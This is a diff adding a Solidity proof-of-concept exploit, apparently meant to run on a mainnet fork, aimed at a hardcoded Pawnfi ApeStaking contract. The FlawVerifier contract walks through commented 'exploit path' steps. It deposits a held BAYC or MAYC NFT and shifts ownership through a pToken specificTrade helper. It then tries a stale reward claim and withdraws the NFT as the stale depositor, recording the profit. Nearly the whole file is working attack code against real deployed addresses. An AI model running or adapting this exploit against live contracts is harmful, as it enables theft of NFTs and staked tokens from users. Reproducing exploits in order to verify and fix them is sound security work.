@@ -1,0 +1,441 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IERC721Like {
+    function balanceOf(address owner) external view returns (uint256);
+    function setApprovalForAll(address operator, bool approved) external;
+}
+
+interface IERC721EnumerableLike is IERC721Like {
+    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
+}
+
+interface INftGatewayLike {
+    function marketInfo(address nftAsset) external view returns (address, address, uint256, uint256, bool);
+}
+
+interface IPTokenPieceLike {
+    function pieceCount() external view returns (uint256);
+}
+
+interface IPTokenApeStakingLike is IPTokenPieceLike {
+    function specificTrade(uint256[] memory nftIds) external;
+}
+
+interface IApeStakingLike {
+    struct DepositInfo {
+        uint256[] mainTokenIds;
+        uint256[] bakcTokenIds;
+    }
+
+    struct StakingInfo {
+        address nftAsset;
+        uint256 cashAmount;
+        uint256 borrowAmount;
+    }
+
+    struct PairNft {
+        uint128 mainTokenId;
+        uint128 bakcTokenId;
+    }
+
+    struct PairNftDepositWithAmount {
+        uint32 mainTokenId;
+        uint32 bakcTokenId;
+        uint184 amount;
+    }
+
+    struct SingleNft {
+        uint32 tokenId;
+        uint224 amount;
+    }
+
+    function apeCoin() external view returns (address);
+    function nftGateway() external view returns (address);
+    function pbaycAddr() external view returns (address);
+    function pmaycAddr() external view returns (address);
+    function setCollectRate(uint256 newCollectRate) external;
+    function depositAndBorrowApeAndStake(
+        DepositInfo calldata depositInfo,
+        StakingInfo calldata stakingInfo,
+        SingleNft[] calldata nfts,
+        PairNftDepositWithAmount[] calldata nftPairs
+    ) external;
+    function claimApeCoin(address nftAsset, uint256[] calldata nftIds, PairNft[] calldata nftPairs) external;
+    function withdraw(
+        uint256[] calldata baycTokenIds,
+        uint256[] calldata maycTokenIds,
+        uint256[] calldata bakcTokenIds
+    ) external;
+}
+
+contract OwnershipChangeHelper {
+    function specificTrade(address pToken, uint256 nftId) external {
+        uint256[] memory ids = new uint256[](1);
+        ids[0] = nftId;
+        IPTokenApeStakingLike(pToken).specificTrade(ids);
+    }
+
+    function sweep(address token, address to) external {
+        IERC20Like erc20 = IERC20Like(token);
+        require(erc20.transfer(to, erc20.balanceOf(address(this))), "SWEEP_TRANSFER_FAILED");
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C;
+    address public constant APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
+    address public constant BAYC = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
+    address public constant MAYC = 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
+    uint256 public constant BASE_PERCENTS = 1e18;
+
+    enum Stage {
+        None,
+        Preconditions,
+        DepositAndStake,
+        OwnershipChange,
+        RewardClaim,
+        StoppedWithdraw,
+        Complete
+    }
+
+    OwnershipChangeHelper public immutable BUYER;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    Stage public lastStage;
+    address public attemptedAsset;
+    uint256 public attemptedTokenId;
+    bytes32 public lastFailure;
+
+    constructor() {
+        BUYER = new OwnershipChangeHelper();
+        _profitToken = APE;
+    }
+
+    function executeOnOpportunity() external {
+        _profitToken = APE;
+        _profitAmount = 0;
+        lastStage = Stage.Preconditions;
+        attemptedAsset = address(0);
+        attemptedTokenId = 0;
+        lastFailure = bytes32(0);
+
+        if (TARGET.code.length == 0) {
+            lastFailure = keccak256("TARGET_NOT_DEPLOYED");
+            return;
+        }
+
+        if (!_hasLiveTargetConfig()) {
+            lastFailure = keccak256("TARGET_NOT_INITIALIZED_AT_FORK");
+            return;
+        }
+
+        address ape = _readAddress(TARGET, IApeStakingLike.apeCoin.selector);
+        if (ape != address(0)) {
+            _profitToken = ape;
+        }
+
+        uint256 profitBefore = _safeBalanceOf(_profitToken, address(this));
+
+        bool success = _attemptWithHeldAsset(IApeStakingLike(TARGET), _profitToken, MAYC);
+        if (!success) {
+            success = _attemptWithHeldAsset(IApeStakingLike(TARGET), _profitToken, BAYC);
+        }
+
+        if (success) {
+            lastStage = Stage.Complete;
+        }
+
+        uint256 profitAfter = _safeBalanceOf(_profitToken, address(this));
+        if (profitAfter > profitBefore) {
+            _profitAmount = profitAfter - profitBefore;
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _hasLiveTargetConfig() internal view returns (bool) {
+        address ape = _readAddress(TARGET, IApeStakingLike.apeCoin.selector);
+        address gateway = _readAddress(TARGET, IApeStakingLike.nftGateway.selector);
+        address pbayc = _readAddress(TARGET, IApeStakingLike.pbaycAddr.selector);
+        address pmayc = _readAddress(TARGET, IApeStakingLike.pmaycAddr.selector);
+
+        return (
+            ape != address(0) &&
+            gateway != address(0) &&
+            pbayc != address(0) &&
+            pmayc != address(0) &&
+            ape.code.length > 0 &&
+            gateway.code.length > 0 &&
+            pbayc.code.length > 0 &&
+            pmayc.code.length > 0
+        );
+    }
+
+    function _attemptWithHeldAsset(IApeStakingLike target, address ape, address nftAsset) internal returns (bool) {
+        if (!_isLiveContract(nftAsset)) {
+            lastFailure = keccak256("NFT_ASSET_NOT_LIVE");
+            return false;
+        }
+
+        uint256 heldNftBalance = _safe721BalanceOf(nftAsset, address(this));
+        if (heldNftBalance == 0) {
+            lastFailure = nftAsset == MAYC ? keccak256("NO_VERIFIER_HELD_MAYC") : keccak256("NO_VERIFIER_HELD_BAYC");
+            return false;
+        }
+
+        uint256 apeBalance = _safeBalanceOf(ape, address(this));
+        if (apeBalance == 0) {
+            lastFailure = keccak256("NO_VERIFIER_HELD_APE");
+            return false;
+        }
+
+        uint256 tokenId;
+        try IERC721EnumerableLike(nftAsset).tokenOfOwnerByIndex(address(this), 0) returns (uint256 heldTokenId) {
+            tokenId = heldTokenId;
+        } catch {
+            lastFailure = keccak256("HELD_NFT_NOT_ENUMERABLE");
+            return false;
+        }
+
+        if (tokenId > type(uint32).max) {
+            lastFailure = keccak256("TOKEN_ID_OVERFLOWS_SINGLE_NFT");
+            return false;
+        }
+        if (apeBalance > type(uint224).max) {
+            lastFailure = keccak256("APE_BALANCE_OVERFLOWS_SINGLE_NFT");
+            return false;
+        }
+
+        attemptedAsset = nftAsset;
+        attemptedTokenId = tokenId;
+
+        // Exploit path 1:
+        // deposit a verifier-controlled NFT so ApeStaking caches `depositor[nftId] = address(this)`.
+        lastStage = Stage.DepositAndStake;
+        _forceApprove(ape, address(target), type(uint256).max);
+        IERC721Like(nftAsset).setApprovalForAll(address(target), true);
+        try target.setCollectRate(BASE_PERCENTS) {} catch {}
+
+        IApeStakingLike.DepositInfo memory depositInfo;
+        depositInfo.mainTokenIds = new uint256[](1);
+        depositInfo.mainTokenIds[0] = tokenId;
+        depositInfo.bakcTokenIds = new uint256[](0);
+
+        IApeStakingLike.StakingInfo memory stakingInfo = IApeStakingLike.StakingInfo({
+            nftAsset: nftAsset,
+            cashAmount: apeBalance,
+            borrowAmount: 0
+        });
+
+        IApeStakingLike.SingleNft[] memory nfts = new IApeStakingLike.SingleNft[](1);
+        nfts[0] = IApeStakingLike.SingleNft({tokenId: _toUint32(tokenId), amount: _toUint224(apeBalance)});
+        IApeStakingLike.PairNftDepositWithAmount[] memory pairs = new IApeStakingLike.PairNftDepositWithAmount[](0);
+
+        try target.depositAndBorrowApeAndStake(depositInfo, stakingInfo, nfts, pairs) {
+        } catch {
+            lastFailure = keccak256("DEPOSIT_AND_STAKE_REVERTED");
+            return false;
+        }
+
+        // Exploit path 2:
+        // shift beneficial ownership through the live Pawnfi pToken market. This keeps the root cause
+        // unchanged while using only pre-existing fork liquidity instead of synthetic helper tokens/markets.
+        lastStage = Stage.OwnershipChange;
+        if (!_attemptOwnershipChange(target, nftAsset, tokenId)) {
+            return false;
+        }
+
+        // Exploit path 4a:
+        // try the stale-owner reward path after beneficial ownership changed. Some live pToken routes stop
+        // staking during transfer; we keep the stale-claim attempt but tolerate that callback side effect.
+        lastStage = Stage.RewardClaim;
+        uint256[] memory singleClaim = new uint256[](1);
+        singleClaim[0] = tokenId;
+        IApeStakingLike.PairNft[] memory claimPairs = new IApeStakingLike.PairNft[](0);
+        try target.claimApeCoin(nftAsset, singleClaim, claimPairs) {} catch {}
+
+        // Exploit path 3 + 4b:
+        // after the pToken owner-change route clears `staker` but leaves `depositor`, the stale depositor
+        // can withdraw the NFT from ApeStaking custody.
+        lastStage = Stage.StoppedWithdraw;
+        uint256[] memory baycIds = new uint256[](nftAsset == BAYC ? 1 : 0);
+        uint256[] memory maycIds = new uint256[](nftAsset == MAYC ? 1 : 0);
+        uint256[] memory bakcIds = new uint256[](0);
+        if (nftAsset == BAYC) {
+            baycIds[0] = tokenId;
+        } else {
+            maycIds[0] = tokenId;
+        }
+
+        try target.withdraw(baycIds, maycIds, bakcIds) {
+            return true;
+        } catch {
+            lastFailure = keccak256("OWNERSHIP_CHANGED_BUT_STOPSTAKE_NOT_OBSERVED");
+            return false;
+        }
+    }
+
+    function _attemptOwnershipChange(IApeStakingLike target, address nftAsset, uint256 tokenId) internal returns (bool) {
+        (address pToken, uint256 pieceCount) = _resolvePTokenRoute(target, nftAsset);
+        if (!_isLiveContract(pToken) || pieceCount == 0) {
+            lastFailure = keccak256("PTOKEN_ROUTE_UNAVAILABLE");
+            return false;
+        }
+
+        // The buyer must acquire the live on-chain pToken representing one NFT. We only use balances that
+        // already exist on the fork on this verifier or the helper; no local ERC20s or synthetic liquidity.
+        if (_safeBalanceOf(pToken, address(BUYER)) < pieceCount) {
+            if (_safeBalanceOf(pToken, address(this)) < pieceCount) {
+                lastFailure = keccak256("NO_PUBLIC_OWNERSHIP_CHANGE_ROUTE_FUNDED");
+                return false;
+            }
+            require(IERC20Like(pToken).transfer(address(BUYER), pieceCount), "PTOKEN_TRANSFER_FAILED");
+        }
+
+        try BUYER.specificTrade(pToken, tokenId) {
+            return true;
+        } catch {
+            lastFailure = keccak256("SPECIFIC_TRADE_REVERTED");
+            return false;
+        }
+    }
+
+    function _resolvePTokenRoute(IApeStakingLike target, address nftAsset) internal view returns (address pToken, uint256 pieceCount) {
+        if (nftAsset == BAYC) {
+            pToken = _readAddress(address(target), IApeStakingLike.pbaycAddr.selector);
+        } else if (nftAsset == MAYC) {
+            pToken = _readAddress(address(target), IApeStakingLike.pmaycAddr.selector);
+        }
+
+        if (_isLiveContract(pToken)) {
+            pieceCount = _readPieceCount(pToken);
+            if (pieceCount > 0) {
+                return (pToken, pieceCount);
+            }
+        }
+
+        address gateway = _readAddress(address(target), IApeStakingLike.nftGateway.selector);
+        if (!_isLiveContract(gateway)) {
+            return (address(0), 0);
+        }
+
+        (bool ok, bytes memory data) =
+            gateway.staticcall(abi.encodeWithSelector(INftGatewayLike.marketInfo.selector, nftAsset));
+        if (!ok || data.length < 160) {
+            return (address(0), 0);
+        }
+
+        bool available;
+        (, pToken, pieceCount,, available) = abi.decode(data, (address, address, uint256, uint256, bool));
+        if (!available || !_isLiveContract(pToken)) {
+            return (address(0), 0);
+        }
+    }
+
+    function _readPieceCount(address pToken) internal view returns (uint256 value) {
+        if (pToken.code.length == 0) {
+            return 0;
+        }
+        (bool ok, bytes memory data) = pToken.staticcall(abi.encodeWithSelector(IPTokenPieceLike.pieceCount.selector));
+        if (ok && data.length >= 32) {
+            value = abi.decode(data, (uint256));
+        }
+    }
+
+    function _readAddress(address target, bytes4 selector) internal view returns (address value) {
+        if (target.code.length == 0) {
+            return address(0);
+        }
+        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
+        if (ok && data.length >= 32) {
+            value = abi.decode(data, (address));
+        }
+    }
+
+    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
+        if (token.code.length == 0) {
+            return 0;
+        }
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (ok && data.length >= 32) {
+            value = abi.decode(data, (uint256));
+        }
+    }
+
+    function _safe721BalanceOf(address token, address account) internal view returns (uint256 value) {
+        if (token.code.length == 0) {
+            return 0;
+        }
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC721Like.balanceOf.selector, account));
+        if (ok && data.length >= 32) {
+            value = abi.decode(data, (uint256));
+        }
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        if (!_callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount))) {
+            require(
+                _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0)),
+                "APPROVE_RESET_FAILED"
+            );
+            require(
+                _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)),
+                "APPROVE_FAILED"
+            );
+        }
+    }
+
+    function _callOptionalBool(address target, bytes memory data) internal returns (bool) {
+        if (target.code.length == 0) {
+            return false;
+        }
+        (bool ok, bytes memory ret) = target.call(data);
+        if (!ok) {
+            return false;
+        }
+        if (ret.length == 0) {
+            return true;
+        }
+        if (ret.length >= 32) {
+            return abi.decode(ret, (bool));
+        }
+        return false;
+    }
+
+    function _isLiveContract(address account) internal view returns (bool) {
+        return account.code.length > 0;
+    }
+
+    function _toUint32(uint256 value) internal pure returns (uint32) {
+        require(value <= type(uint32).max, "UINT32_OVERFLOW");
+        return uint32(value);
+    }
+
+    function _toUint224(uint256 value) internal pure returns (uint224) {
+        require(value <= type(uint224).max, "UINT224_OVERFLOW");
+        return uint224(value);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
